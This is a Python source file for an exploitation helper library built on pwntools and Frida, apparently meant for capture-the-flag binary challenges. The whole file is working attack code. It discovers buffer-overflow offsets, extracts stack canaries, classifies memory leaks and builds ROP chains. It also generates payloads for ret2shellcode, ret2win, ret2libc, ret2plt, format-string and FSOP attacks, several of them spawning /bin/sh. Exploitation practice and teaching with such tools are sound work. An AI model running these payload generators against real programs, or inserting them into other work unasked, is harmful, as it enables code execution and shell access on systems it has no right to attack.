import re
import os
import frida
import threading

from pwn import ELF, ROP, asm, context, cyclic, cyclic_find, log, shellcraft, flat, gdb
from pwnlib.rop.gadgets import Gadget

from pwninit.helpers.utils import u64, u32, upack, encode
from pwninit.helpers.constants import *
from pwninit.io import IOContext

class PwnContext:
    """A context class for managing pwntools state, including IO, ELF binaries,
    libc libraries, and common exploitation helpers.

    Attributes:
        io (IOContext): The active IO connection or process context.
        config (Config): The configuration setup containing binaries and paths.
        elf (ELF): The binary used.
        libc (ELF): The libc used.
        libs (ELF): The libs used.
    """

    def __init__(
        self,
        io: IOContext,
    ) -> None:
        """Initializes the PwnContext with tracking objects and wraps target binaries as ELF objects.

        Args:
            io (IOContext): The current process execution or remote network context wrapper.
        """
        self.io = io
        self.config = io.config

        self._offset = None
        self._canary = None

        self._elf = ELF(io.config.binary) if isinstance(io.config.binary, (str, bytes)) else io.config.binary
        self._libc = ELF(io.config.libc) if isinstance(io.config.libc, (str, bytes)) else io.config.libc        
        self._libs = [
            ELF(lib) if isinstance(lib, (str, bytes)) else lib 
            for lib in (io.config.libs or [])
        ]

    @property
    def elf(self) -> ELF:
        return self._elf

    @property
    def libc(self) -> ELF:
        return self._libc

    @property
    def libs(self) -> list:
        return self._libs

    @property
    def canary(self) -> int | None:
        """Get the canary value for the current process from /proc auxv.

        Returns:
            int | None: The canary value, or None if not found/applicable.
        """
        if self._canary: return self._canary
        if not self.elf.canary: log.warn("no canary in this binary"); return self._canary
        if not self.io.proc: log.warn("impossible to retrieve canary without local proc"); return self._canary

        auxv = open(f"/proc/{self.io.proc.pid}/auxv", "rb").read()
        word = context.bytes
        for i in range(0, len(auxv), 2 * word):
            a_type = u64(auxv[i : i + word])
            a_val = u64(auxv[i + word : i + 2 * word])
            if a_type == 25:
                self.canary = u64((b"\x00" + self.io.proc.readmem(a_val + 1, 7)))
                break

        return self._canary

    @canary.setter
    def canary(self, new_canary: int):
        self._canary = new_canary        
        
        
    @property
    def offset(self) -> int | None:
        """Find the buffer overflow offset dynamically by sending a cyclic pattern
        and reading the corefile fault address.

        Returns:
            int | None: The found offset length.
        """
        if self._offset: return self._offset

        context.delete_corefiles = True

        if not hasattr(self.elf.plt, '__stack_chk_fail'):
            self.io.sl(cyclic(1000))
            self.io.poll(block=True)
            core = self.io.corefile
            self._offset = cyclic_find(core.fault_addr)
            log.info(f"offset found: {self._offset}")
            return self._offset


        hook_triggered = threading.Event()
        session = frida.attach(self.io.proc.pid)

        script_code = f"""
        var baseAddr = Process.enumerateModules()[0].base;
        var targetAddr = baseAddr.add("{hex(self.elf.plt['__stack_chk_fail'])}");
        Interceptor.attach(targetAddr, {{
            onEnter: function(args) {{
                send({{
                    "rbp_val": this.context.rbp
                }});
                var abort = Module.findExportByName(null, "abort");
                new NativeFunction(abort, 'void', [])();
            }}
        }});
        """

        def on_message(message, data):
            if message['type'] == 'send':
                payload = message['payload']
                
                rbp_val = int(payload['rbp_val'], 16)
                self.io.poll(block=True)
                core = self.io.corefile
                data = u32(core.read(rbp_val, 4))
                self._offset = cyclic_find(data)+8

                hook_triggered.set()

        script = session.create_script(script_code)
        script.on('message', on_message)
        script.load()

        self.io.sl(cyclic(1000))

        hook_triggered.wait(timeout=5.0)        
        session.detach()

        if self._offset:
            log.info(f"offset found: {self._offset}")
            return self._offset
        else:
            log.error("Failed to find offset! (Did __stack_chk_fail trigger?)")
            return None

    @offset.setter
    def offset(self, new_offset: int):
        self._offset = new_offset

    def __find_sym(self, symbol: str | int, bin_obj: ELF) -> int:
        if isinstance(symbol, int):
            return symbol
        elif "+" in symbol:
            func, off = symbol.split("+")
            return bin_obj.sym[func] + int(off, 0)
        elif "-" in symbol:
            func, off = symbol.split("-")
            return bin_obj.sym[func] - int(off, 0)
        else:
            return bin_obj.sym[symbol]

    def resolve(self, symbol: str | int) -> int:
        """Resolve a symbol or offset expression within the known ELF context,
        libc, or extra libraries.

        Args:
            symbol (str | int): The symbol name, structural math, or absolute address.

        Returns:
            int: The resolved memory address.

        Example:
        
            >>> ctx.resolve("main")
            0x401196
            >>> ctx.resolve("system+0x10")
            0x7ffff7e12390
        """
        for b in [self.libc, self.elf] + self.libs:
            try:
                return self.__find_sym(symbol, b)
            except KeyError:
                pass

        log.error(f"{symbol} not found !")

    def check_leak(self, leaked: int) -> tuple:
        """Match a raw memory leak value against known virtual memory regions.

        Args:
            leaked (int): The raw memory address leaked.

        Returns:
            tuple: A (name, base_address) pair if a region is matched, else (None, None).
        """
        if not self.io or not self.io.proc:
            return None, None

        if self.canary and hex(leaked) in hex(self.canary):
            return "canary", self.canary

        libs = self.io.libs()
        for m in self.io.maps():
            if not (m.start <= leaked <= m.end):
                continue

            name = os.path.basename(m.path[1:-1] if '[' in m.path else m.path).partition(".")[0]
            base = m.address 
            if m.path in libs:
                base = libs[m.path]
            return name, base

        return None, None

    def find_leak(self, buf: int | str | bytes) -> int:
        """Extract and isolate an address integer out of standard text or binary buffers.

        Args:
            buf (int | str | bytes): Raw buffer chunk containing the potential leak.

        Returns:
            int: The isolated absolute leak value.

        Example:

            >>> find_leak(b'\\x00\\x00\\x00\\x9d{\\xdar\\x90 \\xf2\\x10.\\xf2\\x92\\xff\\x7f\\x00\\x00\\xeeo\\x9f\\r\\x1bV\\x00\\x00\\xd3\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00vu?\\xfb\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x9d{\\xdar\\x90 \\xf2\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8LU?\\xfb\\x7f\\x00\\x00\\x10/\\xf2\\x92\\xff\\x7f\\x00\\x00zo\\x9f\\r\\x1bV\\x00\\x000\\xf0p?\\x01\\x00\\x00\\x00(/')
                [*] [canary]: leak[3:10]
                [*] [canary]: leak[4:10]
                [*] [stack]: leak[10:16]
                [*] [boring]: leak[18:24]
                [*] [ld-2]: leak[34:40]
                [*] [canary]: leak[51:58]
                [*] [canary]: leak[52:58]
                [*] [libc-2]: leak[66:72]
                [*] [stack]: leak[74:80]
                [*] [boring]: leak[82:88]
        """
        if isinstance(buf, int):
            return buf

        buf = encode(buf)
        if m := re.search(rb"0x[0-9a-fA-F]+", buf):
            leak_val = int(m.group(), 16)
        elif len(buf) <= 8:
            leak_val = upack(buf)
        else:
            buf = buf.rstrip(b"\n")
            for i in range(len(buf)):
                for j in range(6, 8):
                    l_val = upack(buf[i : i + j])
                    name, _ = self.check_leak(l_val)
                    if name:
                        log.info(f"[{name}]: leak[{i}:{i + j}]")
                        break
            log.warn("cannot find leak, try another way")
            exit(0)

        return leak_val

    def leak(self, leaked: int | str | bytes, offset: int = 0, name: str = "") -> int:
        """Parse, apply math adjustments, map to segments, and log an expected leak.

        Args:
            leaked (int | str | bytes): Raw string containing a leak, or the address directly.
            offset (int): Base offset value to subtract from the parsed address.
            name (str): Enforce mapping assignment to a known identifier (e.g., "libc").

        Returns:
            int: The normalized leak address value.

        Example:
        
            >>> stack = leak(b"b'] The address of cmd where you are writing to is: 0x7fff121e12d0'")
            [*] [stack]: 0x7fff121e12d0
            >>> hex(stack)
            0x7fff121e12d0

            >>> libc.address = leak(b"puts address: 0x7ffff7e114a0", offset=libc.sym['puts'])
        """
        base = 0
        leaked = self.find_leak(leaked) - offset

        if not name:
            name, base = self.check_leak(leaked)

        if base > 0 and leaked != base and name != 'stack':
            log.info(f"[{name}]: leak = {leaked:#x}, base = {base:#x}, offset = {leaked - base}")
        elif name:
            log.info(f"[{name}]: {leaked:#x}")
        elif not self.io:
            log.info(f"leak = {leaked:#x}")
        else:
            log.warn("no leak found")

        return leaked

    def ropchain(self, chain: dict, ret: bool = True) -> bytes:
        """Construct a compiled ROP chain given target calls and setup states.

        Args:
            chain (dict): Function labels or addresses mapped to parameter list configurations.
            ret (bool): Insert stack aligning `ret` instructions when building chains.

        Returns:
            bytes: The assembled payload sequence.

        Example:
        
            >>> ropchain({"puts": [0x404000], "main": []})
            b'\\xaa\\xbb...'
        """
        elfs = []
        if self.elf and (not self.elf.pie or self.elf.address):
            elfs.append(self.elf)

        if self.libc and (not self.libc.aslr or self.libc.address):
            elfs.append(self.libc)

        rop = ROP(elfs)
        if elfs and ret:
            rop.raw(rop.ret.address)

        for func, params in chain.items():
            if isinstance(func, str) and "+" in func:
                f, off = func.split("+")
                func = self.resolve(f) + int(off)

            if not isinstance(params, dict):
                rop.call(func, params)
                continue

            for value, gadget in rop.setRegisters(params):
                if isinstance(gadget, Gadget):
                    rop.raw(gadget)
                else:
                    rop.raw(value)

            rop.call(func)

        rop.raw(rop.ret.address)
        log.info(f"ROP :\n{rop.dump()}")
        return rop.chain()

    def bof(self, data: bytes | int, opt: dict = {}, bp: int = 0, **kwargs) -> bytes:
        """Generate a basic buffer overflow payload injecting optional canary or base pointers based on binary arch.

        Args:
            data (bytes | int): Intended execution payload control destination (e.g., return address).
            opt (dict): Specific index manual offset dictionary adjustments.
            bp (int): Target base pointer (RBP/EBP) replacement value.

        Returns:
            bytes: Fully structured flat stream buffer padding.

        Example:
        
            >>> ctx.offset = 40
            >>> bof(0x401196)
            b'aaaabaaacaaadaaaeaaafaaa...\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00'
        """
        offset_val = self.offset
        canary_val = self.canary

        if opt is None:
            opt = {}

        if canary_val:
            opt |= {offset_val - context.bytes * 2: canary_val}

        if bp:
            opt |= {offset_val - context.bytes: bp}

        return flat({offset_val: data} | opt, **kwargs)

    def ret2shellcode(self, addr: int | str, ret: bool = True, **kwargs) -> bytes:
        """Generate a shellcode and a ropchain to call it.

        Args:
            addr (int | str): Target point reference calculation indicator context.
            ret (bool): Include initial stack alignment layout properties.

        Returns:
            bytes: Complete payload string bytes.

        Example:
        
            >>> ret2shellcode("bss_target")
            b'\\x90\\x90...jhh///sh/bin...'
        """
        addr = self.resolve(addr)
        shellcode = asm(shellcraft.sh())
        stub = (
            asm("sub esp, 0x1000")
            if context.bits == 32
            else asm("sub rsp, 0x1000")
        )
        shellcode = stub + shellcode
        padding_len = (
            self.offset
            - context.bytes * (self.elf.canary + 1)
            - len(shellcode)
        )
        padding = asm("nop") * padding_len
        addr += len(padding) // 2
        payload = self.ropchain({addr: []}, ret)
        return self.bof(payload, opt={0: [padding, shellcode]}, **kwargs)

    def ret2win(self, win: str | int, params: list | tuple = [], ret: bool = True, **kwargs) -> bytes:
        """Generate a ret2win payload.

        Args:
            win (str | int): Name identifier or absolute function target.
            params (list | tuple): Argument values to associate onto target registers.
            ret (bool): Append structural target ret properties.

        Returns:
            bytes: Assembled operational byte blocks.

        Example:
        
            >>> ret2win("win_secret_func", params=[0xdeadbeef, 0xcafebabe])
        """
        if params is None:
            params = []
        addr = self.resolve(win)
        payload = self.ropchain({addr: params}, ret)
        return self.bof(payload, **kwargs)

    def ret2libc(self, ret: bool = True, **kwargs) -> bytes:
        """Generate a ret2libc payload.

        Example:
        
            >>> ret2libc()
        """
        system = self.libc.sym["system"]
        payload = self.ropchain({system: [self.binsh()]}, ret)
        return self.bof(payload, **kwargs)

    def ret2plt(self, func: str | int = "puts", ret2main: str | int = "main", ret: bool = True, **kwargs) -> bytes:
        """Generate a payload that call func(got[func]), usefull to defeat PIE.

        Args:
            func (str | int): PLT mapping reference to extract details via.
            ret2main (str | int): Destination structure to route towards immediately following.

        Example:
        
            >>> ret2plt(func="printf", ret2main="main")
        """
        func_plt = self.elf.plt[func]
        func_got = self.elf.got[func]
        if ret2main:
            main_addr = self.resolve(ret2main)
            payload = self.ropchain({func_plt: [func_got], main_addr: []}, ret)
        else:
            payload = self.ropchain({func_plt: [func_got]}, ret)
        return self.bof(payload, **kwargs)

    def format_string(self, n: int = 100) -> bytes:
        """Find the format string offset.

        Example:
        
            >>> format_string(n=50)
            6
        """
        payload = "A" * context.bytes + ".%p" * n
        self.io.send(payload)
        output = self.io.recv().split(b".")
        log.info(f"format string : {output}")
        ascii_hex_target = "0x" + "41" * context.bytes
        return output.index(ascii_hex_target.encode())

    def fsopsh(
        self,
        func: str | int = "system",
        arg: bytes | str = b"/bin/sh\0",
        file: str | int = "_IO_2_1_stdout_",
        trigger: int = XSPUTN,
        lock: int = 0x0,
        chain: int = 0x0,
    ) -> bytes:
        """Generate file stream objects to get an arb call.

        Args:
            func (str | int): Target destination routine location address values.
            arg (bytes | str): Variable string argument properties.
            file (str | int): Stream object description table base points.

        Example:
        
            >>> fsopsh(func="win", file="_IO_2_1_stderr_")
        """
        func = self.resolve(func)
        file = self.resolve(file)
        arg = encode(arg)
        lock = lock or file + 0x800

        return flat(
            {
                0x00: [0x3B01010101010101, arg],
                0x68: chain,
                0x78: -1,
                0x88: lock,
                0x90: -1,
                0xA0: file,
                0xD0: func,
                0xD8: self.libc.sym["_IO_wfile_jumps"] - (trigger - OVERFLOW),
                0xE0: file + (0xD0 - 0x68),
            },
            filler=b"\0",
        )

    def binsh(self) -> int:
        """Locate the string constant value of `/bin/sh` matching references across libc targets."""
        return next(self.libc.search(b"/bin/sh\0"))


def _require_ctx() -> PwnContext:
    from pwninit.context import pwnctx
    if pwnctx is None:
        raise RuntimeError("PwnContext not initialized - call set_ctx() first")
    return pwnctx

def _ctx(name):
    def wrapper(*args, **kwargs):
        ctx = _require_ctx()
        return getattr(ctx, name)(*args, **kwargs)

    wrapper.__name__ = name
    return wrapper

leak = _ctx("leak")
find_leak = _ctx("find_leak")
resolve = _ctx("resolve")
check_leak = _ctx("check_leak")
ropchain = _ctx("ropchain")
bof = _ctx("bof")
ret2shellcode = _ctx("ret2shellcode")
ret2win = _ctx("ret2win")
ret2libc = _ctx("ret2libc")
ret2plt = _ctx("ret2plt")
format_string = _ctx("format_string")
fsopsh = _ctx("fsopsh")
binsh = _ctx("binsh")
